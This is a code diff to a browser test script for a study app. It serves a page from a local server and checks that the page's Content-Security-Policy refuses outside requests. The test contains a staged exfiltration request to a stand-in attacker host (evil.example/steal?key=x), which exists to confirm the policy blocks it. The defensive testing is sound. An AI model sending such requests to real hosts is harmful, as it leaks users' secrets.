@@ -126,13 +126,27 @@ const MD = ['---', 'unit: Ventricular Loading', '---', '', '## Teaching Points',
     await ctx.close();
 
     head('what the page may do');
-    ({ ctx, p } = await fresh('csp'));
+    /* from a web address, as on the iPad: a file:// page is its own case
+       (WebKit refuses its cross-origin requests before any policy is read) */
+    const server = require('http').createServer((q, r) => {
+      const name = decodeURIComponent(q.url.split('?')[0]).replace(/^\/+/, '') || 'index.html';
+      const file = path.join(dir, path.normalize(name));
+      if (!file.startsWith(dir)) { r.statusCode = 403; return r.end(); }
+      fs.readFile(file, (e, b) => { if (e) { r.statusCode = 404; return r.end(); } r.setHeader('content-type', /\.html$/.test(file) ? 'text/html; charset=utf-8' : 'application/octet-stream'); r.end(b); });
+    });
+    await new Promise(res => server.listen(0, '127.0.0.1', res));
+    ctx = await browser.newContext({ serviceWorkers: 'block' });
+    p = watch(await ctx.newPage(), events, 'csp', errors);
+    await p.goto('http://127.0.0.1:' + server.address().port + '/');
+    await p.waitForSelector('#chip-import-study', T);
     const sec = await p.evaluate(async () => {
       const csp = (document.querySelector('meta[http-equiv="Content-Security-Policy"]') || {}).content || '';
       /* measured by the browser's own report of what it refused: this
-         sandbox has no network, so a failed fetch alone would prove nothing */
+         sandbox has no network, so a failed fetch alone would prove nothing.
+         On window: the report is fired at the document and bubbles there,
+         whichever of the two an engine favours */
       const refused = [];
-      document.addEventListener('securitypolicyviolation', e => refused.push(e.violatedDirective + ' ' + e.blockedURI));
+      window.addEventListener('securitypolicyviolation', e => refused.push(e.violatedDirective + ' ' + e.blockedURI));
       try { await fetch('https://evil.example/steal?key=x'); } catch (e) {}
       await new Promise(r => setTimeout(r, 300));
       return { csp, refused };
@@ -151,6 +165,7 @@ const MD = ['---', 'unit: Ventricular Loading', '---', '', '## Teaching Points',
       .filter(f => /new Function\(|[^.\w]eval\(/.test(blankComments(fs.readFileSync(path.join(ROOT, 'memorizer', 'src', f), 'utf8'))));
     ok('and the app\u2019s own code builds no function from a string', own.length === 0, own.join(', '));
     await ctx.close();
+    server.close();
 
     head('the on-device model’s files, read back where the engine keeps them');
     ({ ctx, p } = await fresh('model-files'));
